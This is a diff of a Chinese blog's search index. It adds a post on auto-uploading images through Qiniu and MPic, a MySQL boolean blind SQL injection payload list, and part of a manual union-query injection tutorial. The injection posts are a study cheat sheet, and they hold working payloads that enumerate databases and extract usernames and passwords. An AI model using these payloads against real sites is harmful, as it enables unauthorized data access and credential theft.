@@ -1,6 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[windows下解决图片上传的麻烦]]></title>
+    <url>%2F2017%2F08%2F29%2FsolveHexoImage%2F</url>
+    <content type="text"><![CDATA[众所周知，markdown添加图片要先上传，再复制图片链接。这里给出了一种简单的解决办法，可以一步实现上传和生成连接 Hexo_MD + 七牛API+MPic图床神器 注册账号 你要到七牛官网上注册一个七牛个人账号，经过支付宝认证之后可以获得10G的免费储存空间。 创建一个对象储存空间，作为分享图片的仓库创建选项中只需要注意选择公开空间即可，其它的无所谓。 创建结束后检查一下空间的图片保护选项是否关闭，如果没有关闭，就手动关闭一下。 下载软件：Mpic 图床神器。 下载完成后，设置账号——》设置如下图 具体配置： 七牛空间名就是创建的空间名称 AccessKey和SecretKey在个人中心可以看到，复制进来 域名是创建的空间的域名 设置完成后，需要上传图片的时候，打开软件，复制或者截图就会自动上传并生成图片链接了（在屏幕右下角有程序图标，右键可以开启或关闭自动上传功能）]]></content>
+      <categories>
+        <category>markdown</category>
+      </categories>
+      <tags>
+        <tag>markdown</tag>
+        <tag>图床</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Mysql布尔盲注payload]]></title>
+    <url>%2F2017%2F08%2F26%2FboolBlandSQLInjection%2F</url>
+    <content type="text"><![CDATA[如题所示 payload12345678910111213141516#判断当前数据库长度?id=12&apos; and (select length(database())&gt;5) --+#判断当前数据库名?id=12&apos; and (select ascii(substr(database(),1,1))&gt;=97) --+#判断第一个表的表长度?id=12&apos; and (select length(table_name)&gt;5 from information_schema.tables where table_schema=database() limit 0,1) --+ #判断第二个表名?id=12&apos; and (select ascii(substr(table_name,1,1))&gt;97 from information_schema.tables where table_schema=database() limit 1,1) --+ #判断users表的第一个字段长度?id=12&apos; and (select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断users表的第一个字段名?id=12&apos; and (select ascii(substr(column_name,1,1))&gt;65 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 0,1) --+ #判断username列的第一条数据长度?id=12&apos; and (select length(username)&gt;1 from users limit 0,1) --+ #判断username列的第一条数据?id=12&apos; and (select ascii(substr(username,1,1))&gt;=65 from users limit 0,1) --+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>布尔盲注</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[MySQL手工联合查询注入]]></title>
     <url>%2F2017%2F08%2F26%2FMySQLUnionInjection%2F</url>
     <content type="text"><![CDATA[内容如题 PHP+MySQL简单手工注入基本流程一、判断是否存在注入1234567891011SQL注入按类型分为两种：数字型和字符型判断方法的区别：字符型用&apos;判断，数字型用and 1=1 和and 1=2判断注释方法：# 编码后为%23，hash语法-- s 后跟空格后面随意写字符，又例：--+-- - SQL语法;%00 可以使用，空字节/* 必须闭合，C-style语法 · 反引号（左上角的字符） 判断sql注入（显错和基于错误的盲注）：单引号，and 1=1 和and 1=2，双引号，反斜杠，注释等 判断基于时间的盲注:在上面的基础上，加个sleep函数 ，如sleep(5) (函数不同数据库有所不同)例子： &apos; and sleep(5) &quot; and sleep(5) 二、判断有几列数据1234567891011121314151617order by 1 #一直到出现错误为止and 1=2 union select 1,2 #一直到成功为止，一般页面会出现显示位，出现显示位的地方可以放我们想要放的东西，例如：user(),database(),@@version，则会在显示位出现连接的用户、数据库、版本等信息可以放的东西：database(),schema() #数据库名user(),current_user(),current_user,system_user(),session_user() #用户@域名@@version,version(),@@global.version #mysql版本信息@@basedir #mysql安装路径@@datadir #数据库存放路径@@hostname #主机名@@version_compile_os; #操作系统指纹@@global.version_compile_os #感觉和上面差不多now() #当前时间：年月日时分秒current_date #当前时间：年月日char() #指定字符load_file() #读取指定文件ord(mid(user(),1,1))=114 #系统权限，正常返回说明为root小工具：火狐F9——》SQL——》union select statement——》输入数字，直接出现联合查询，方便爆出列数 三、得到数据库名1234561、使用database()直接得到当前数据库名2.1 如果database()被过滤，则使用union select 1,schema_name,3,4,5,6 from information_schema.schemata limit 0,1 查看数据库名，可以通过Limit设置显示第几行，也就可以显示其他的数据库名。根据数据库名爆表名（如果database()）被过滤 2.2 UNION SELECT 1,group_concat(schema_name),3,database(),5,6 from information_schema.schemata 显示所有数据库名，函数group_concat是显示所有 2.3 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; MySQL 4版本时用version=9，MySQL 5版本时用version=10 Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息 四、得到表名1231、UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; limit 0,1 #显示s10数据库的表名，一个一个来2、union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&apos;s10&apos; #显示s10数据库的表名，全部显示3、SELECT table_name FROM information_schema.tables WHERE table_name LIKE &apos;%user%&apos; #查询包含user的表 五、得到列名12341、UNION SELECT 1,2,3,database(),5,column_name from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; limit 0,1 #查询列名，一个一个来2、union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=&apos;s10&apos; and table_name=&apos;users&apos; #查询列名，一次全部显示3、SELECT column_name FROM information_schema.columns WHERE table_name LIKE &apos;%user%&apos; #查询包含user的列4、SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名 #这个需要web展示页面有你所注入查询的一个字段。 六、得到想要的数据1231、union select 1,username,password,4,5,6 from users; #在不同的显示位显示需要的内容2、union select 1,concat(userename,0x23,password),3,4,5,6 from users; #函数concat可以联合显示数据，0x23是分隔符3、union select 1,concat_ws(0x23,username,email,age,password),3,4,5,6 from users #函数concat_ws只写一次分隔符即可]]></content>
